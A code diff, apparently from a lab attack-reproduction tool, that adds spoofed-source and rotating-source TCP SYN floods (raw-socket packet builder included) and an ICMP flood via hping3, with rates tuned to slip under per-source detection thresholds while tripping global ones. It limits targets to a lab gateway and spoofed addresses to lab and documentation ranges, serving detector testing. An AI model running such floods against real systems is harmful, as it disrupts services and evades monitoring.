@@ -6,6 +6,11 @@ SCANNER_USER_AGENTS는 Suricata local.rules의 sid 9000004 pcre 목록
 사용자가 임의의 대상을 지정하지 못하게 CLI에는 --host가 없다.
 대상은 실행 환경의 TARGET_URL만 사용하며, 172.28.0.0/16 대역의
 gateway .10:8080 주소만 허용한다.
+
+출발지 위조(guide57, S7·S9): --spoof-source는 이 PC의 edge 대역(.10 제외)·core 대역(172.30.0.0/24)·
+문서용 주소 192.0.2.0/24만 받는다. gateway는 위조된 출발지로 SYN-ACK를 돌려보내므로, 아무 주소나
+허용하면 실제 인터넷 주소로 응답 패킷이 나간다. 같은 이유로 hping3의 --rand-source는 쓰지 않고,
+출발지를 바꾸는 폭주(--rand-source)는 이 PC edge 대역의 비어 있는 .200~.254만 돌려 쓴다.
 """
 
 from __future__ import annotations
@@ -15,9 +20,12 @@ import ipaddress
 import json
 import os
 import re
+import random
 import socket
+import struct
 import subprocess
 import sys
+import time
 from html.parser import HTMLParser
 from pathlib import PurePosixPath
 from typing import Callable, Mapping, TextIO
@@ -65,6 +73,20 @@ MAX_SYN_COUNT = 5000
 MAX_BRUTE_ATTEMPTS = 20
 MAX_SCANNER_REQUESTS = 10
 MAX_HTTP_REQUESTS = 500
+MAX_ICMP_COUNT = 5000
+
+# 위조 출발지로 허용하는 대역(guide57). edge 대역은 대상 gateway 주소로 정해지므로 실행할 때 더한다.
+# core는 S7 ②(우리 내부 주소 위조가 차단으로 이어지지 않는지), 192.0.2.0/24(TEST-NET-1, 인터넷에서
+# 쓰이지 않는 문서용 주소)는 S7 ④(edge 대역 밖 위조 = SPOOFED_SRC) 확인용이다.
+SPOOF_EXTRA_NETWORKS = (
+    ipaddress.ip_network("172.30.0.0/24"),
+    ipaddress.ip_network("192.0.2.0/24"),
+)
+# 출발지를 바꾸는 SYN 폭주가 돌려 쓰는 edge 끝자리(netwatch/README.md 4장 주소 나눔의 S7 전용 칸).
+ROTATING_HOST_NUMBERS = range(200, 255)
+# 출발지를 바꾸는 폭주의 초당 패킷 수. l4-detector 전체 SYN 기준(L4_GLOBAL_SYN_PER_SEC 1000)은 넘고,
+# 출발지 하나당은 초당 약 36개라 출발지별 기준(Suricata 5초 100개·Scapy 1초 100개)에는 걸리지 않는다.
+ROTATING_PACKETS_PER_SECOND = 2000
 
 
 class CsrfTokenParser(HTMLParser):
@@ -250,6 +272,101 @@ def run_process(
     )
     write_subprocess_output(completed, stderr)
     return completed
+
+
+def validate_spoof_source(value: str, target_host: str) -> str:
+    """--spoof-source 값이 허용 대역 안의 IPv4인지 확인하고 표준 표기로 돌려준다."""
+    try:
+        address = ipaddress.ip_address(value)
+    except ValueError as error:
+        raise ValueError(f"--spoof-source가 IP 주소가 아닙니다: {value!r}") from error
+    if address.version != 4:
+        raise ValueError("--spoof-source는 IPv4만 받습니다.")
+    edge = ipaddress.ip_network(f"{target_host}/24", strict=False)
+    if address == ipaddress.ip_address(target_host):
+        raise ValueError("--spoof-source에 대상 gateway 주소를 쓸 수 없습니다.")
+    if address in edge or any(address in network for network in SPOOF_EXTRA_NETWORKS):
+        return str(address)
+    raise ValueError(
+        "--spoof-source는 이 PC edge 대역·172.30.0.0/24·192.0.2.0/24만 쓸 수 있습니다 "
+        "(그 밖의 주소로 위조하면 gateway 응답이 실제 인터넷 주소로 나갑니다)."
+    )
+
+
+def rotating_sources(target_host: str) -> list[str]:
+    """출발지를 바꾸는 폭주가 돌려 쓰는 주소 목록(이 PC edge 대역의 .200~.254)."""
+    base = int(ipaddress.ip_network(f"{target_host}/24", strict=False).network_address)
+    return [str(ipaddress.ip_address(base + number)) for number in ROTATING_HOST_NUMBERS]
+
+
+def _checksum(data: bytes) -> int:
+    """인터넷 체크섬(RFC 1071). IP·TCP 헤더 모두 같은 방식이다."""
+    if len(data) % 2:
+        data += b"\0"
+    total = sum(struct.unpack(f"!{len(data) // 2}H", data))
+    total = (total >> 16) + (total & 0xFFFF)
+    total += total >> 16
+    return ~total & 0xFFFF
+
+
+def build_syn_packet(src: str, dst: str, src_port: int, dst_port: int, seq: int, ip_id: int = 0) -> bytes:
+    """IPv4 헤더가 붙은 TCP SYN 패킷 하나를 만든다(raw 소켓으로 그대로 보낸다)."""
+    src_raw = socket.inet_aton(src)
+    dst_raw = socket.inet_aton(dst)
+    offset_flags = (5 << 12) | 0x02  # 헤더 길이 20바이트, SYN
+    tcp_header = struct.pack("!HHIIHHHH", src_port, dst_port, seq, 0, offset_flags, 64240, 0, 0)
+    pseudo = src_raw + dst_raw + struct.pack("!BBH", 0, socket.IPPROTO_TCP, len(tcp_header))
+    tcp_header = tcp_header[:16] + struct.pack("!H", _checksum(pseudo + tcp_header)) + tcp_header[18:]
+    ip_header = struct.pack(
+        "!BBHHHBBH4s4s", 0x45, 0, 20 + len(tcp_header), ip_id, 0, 64, socket.IPPROTO_TCP, 0, src_raw, dst_raw,
+    )
+    ip_header = ip_header[:10] + struct.pack("!H", _checksum(ip_header)) + ip_header[12:]
+    return ip_header + tcp_header
+
+
+def send_rotating_syn(
+    target_host: str,
+    target_port: int,
+    count: int,
+    *,
+    send: Callable[[bytes, str], None] | None = None,
+    sleep: Callable[[float], None] = time.sleep,
+    rng: random.Random | None = None,
+) -> int:
+    """출발지를 패킷마다 바꾼 SYN을 count개, 초당 ROTATING_PACKETS_PER_SECOND개 속도로 보낸다.
+
+    send를 주지 않으면 raw 소켓(IPPROTO_RAW, NET_RAW 권한 필요)으로 보낸다. 100개씩 묶어 보내고
+    남은 시간만큼 쉬어 속도를 맞춘다. 보낸 개수를 돌려준다.
+    """
+    rng = rng or random.Random()
+    sources = rotating_sources(target_host)
+    sock = None
+    if send is None:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+
+        def send(packet: bytes, dst: str) -> None:
+            sock.sendto(packet, (dst, 0))
+
+    batch = 100
+    interval = batch / ROTATING_PACKETS_PER_SECOND
+    sent = 0
+    try:
+        while sent < count:
+            started = time.monotonic()
+            for _ in range(min(batch, count - sent)):
+                packet = build_syn_packet(
+                    rng.choice(sources), target_host, rng.randint(1024, 65535), target_port,
+                    rng.getrandbits(32), rng.getrandbits(16),
+                )
+                send(packet, target_host)
+                sent += 1
+            remaining = interval - (time.monotonic() - started)
+            if remaining > 0:
+                sleep(remaining)
+    finally:
+        if sock is not None:
+            sock.close()
+    return sent
 
 
 def base_result(step: str, target_url: str) -> dict:
@@ -524,8 +641,30 @@ def command_synflood(
     count: int,
     runner: Callable[..., object],
     stderr: TextIO,
+    *,
+    spoof_source: str | None = None,
+    rand_source: bool = False,
+    rotating_sender: Callable[..., int] | None = None,
 ) -> tuple[dict, int]:
-    """속도와 개수를 제한한 SYN 패킷을 전송한다."""
+    """속도와 개수를 제한한 SYN 패킷을 전송한다.
+
+    spoof_source를 주면 hping3 -a로 그 출발지를 적어 보낸다(S7 ②③④). rand_source면 hping3 대신
+    send_rotating_syn으로 edge .200~.254 출발지를 돌려 쓴다(S7 ①, 출발지를 바꾸는 폭주).
+    """
+    result = base_result("synflood", target_url)
+
+    if rand_source:
+        sender = send_rotating_syn if rotating_sender is None else rotating_sender
+        try:
+            sent = sender(target_host, target_port, count)
+        except OSError as error:
+            stderr.write(f"[FAIL] raw 소켓 전송 실패(NET_RAW 권한 확인): {type(error).__name__}\n")
+            result.update({"error": "raw_socket", "mode": "rand-source"})
+            return result, 1
+        result.update({"ok": True, "sent": sent, "mode": "rand-source",
+                       "sources": len(ROTATING_HOST_NUMBERS)})
+        return result, 0
+
     command = [
         "hping3",
         "-S",
@@ -535,18 +674,49 @@ def command_synflood(
         "u2000",
         "-c",
         str(count),
-        target_host,
     ]
+    if spoof_source is not None:
+        command += ["-a", spoof_source]
+    command.append(target_host)
     completed = run_process(command, runner, stderr)
     exit_code = int(getattr(completed, "returncode", 1))
 
-    result = base_result("synflood", target_url)
     result.update(
         {
             "ok": exit_code == 0,
             "sent": count,
         }
     )
+    if spoof_source is not None:
+        result["spoof_source"] = spoof_source
+    return result, 0 if result["ok"] else 1
+
+
+def command_icmpflood(
+    target_host: str,
+    target_url: str,
+    count: int,
+    runner: Callable[..., object],
+    stderr: TextIO,
+    *,
+    spoof_source: str | None = None,
+) -> tuple[dict, int]:
+    """ICMP echo 요청을 초당 1000개 속도로 count개 보낸다(guide57, S9).
+
+    출발지 하나에서 초당 1000개라 Suricata ICMP 폭주 규칙(9000005, 1초 200개)에 걸리고, fw-agent의
+    LW_L3 체인(출발지별 초당 50개)이 넘는 만큼 버린다.
+    """
+    command = ["hping3", "--icmp", "-i", "u1000", "-c", str(count)]
+    if spoof_source is not None:
+        command += ["-a", spoof_source]
+    command.append(target_host)
+    completed = run_process(command, runner, stderr)
+    exit_code = int(getattr(completed, "returncode", 1))
+
+    result = base_result("icmpflood", target_url)
+    result.update({"ok": exit_code == 0, "sent": count})
+    if spoof_source is not None:
+        result["spoof_source"] = spoof_source
     return result, 0 if result["ok"] else 1
 
 
@@ -665,6 +835,17 @@ def create_parser() -> argparse.ArgumentParser:
         type=bounded_int(1, MAX_SYN_COUNT),
         default=3000,
     )
+    synflood_source = synflood.add_mutually_exclusive_group()
+    synflood_source.add_argument("--spoof-source", default=None)
+    synflood_source.add_argument("--rand-source", action="store_true")
+
+    icmpflood = subparsers.add_parser("icmpflood")
+    icmpflood.add_argument(
+        "--count",
+        type=bounded_int(1, MAX_ICMP_COUNT),
+        default=3000,
+    )
+    icmpflood.add_argument("--spoof-source", default=None)
 
     httpflood = subparsers.add_parser("httpflood")
     httpflood.add_argument("--path", default="/")
@@ -693,6 +874,7 @@ def main(
     stderr: TextIO | None = None,
     request_get: Callable[..., object] | None = None,
     session_factory: Callable[[], object] | None = None,
+    rotating_sender: Callable[..., int] | None = None,
 ) -> int:
     """대상을 환경변수에서 읽고 선택한 재현 명령을 실행한다."""
     parser = create_parser()
@@ -718,6 +900,14 @@ def main(
     except ValueError as error:
         active_stderr.write(f"[FAIL] {error}\n")
         return 2
+
+    spoof_source = None
+    if getattr(args, "spoof_source", None) is not None:
+        try:
+            spoof_source = validate_spoof_source(args.spoof_source, target_host)
+        except ValueError as error:
+            active_stderr.write(f"[FAIL] {error}\n")
+            return 2
 
     if args.command == "scan":
         result, exit_code = command_scan(
@@ -762,6 +952,18 @@ def main(
             args.count,
             active_runner,
             active_stderr,
+            spoof_source=spoof_source,
+            rand_source=args.rand_source,
+            rotating_sender=rotating_sender,
+        )
+    elif args.command == "icmpflood":
+        result, exit_code = command_icmpflood(
+            target_host,
+            target_url,
+            args.count,
+            active_runner,
+            active_stderr,
+            spoof_source=spoof_source,
         )
     elif args.command == "httpflood":
         result, exit_code = command_httpflood(
